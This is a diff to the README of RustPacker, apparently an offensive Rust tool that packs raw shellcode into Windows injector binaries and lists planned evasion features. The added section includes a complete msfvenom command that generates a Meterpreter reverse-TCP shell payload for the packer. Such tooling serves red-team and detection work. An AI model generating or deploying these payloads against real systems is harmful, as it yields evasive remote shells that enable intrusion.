@@ -41,6 +41,15 @@ Run RustPacker:
 - `cd RustPacker/`
 - `cargo run -- -f shellcode.bin -i ct`
 
+# Full documentation
+
+## Create shellcode
+RustPacker is compatible with any "raw" shellcode.
+
+### Metasploit / MSFvenom
+You can generate raw MSF shellcode using msfvenom's raw format. Ex:
+- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw -o msf.bin`
+
 ## Todo
 - [X] Port createThread Rust template
 - [X] Port createRemoteThread Rust template
@@ -51,6 +60,7 @@ Run RustPacker:
 - [X] Build dockerfile
 - [X] Strip output binaries
 - [ ] Support the awesome evasions from https://github.com/memN0ps/mordor-rs
+- [ ] Write detailed doc
 
 ## Credits
 - Rust discord
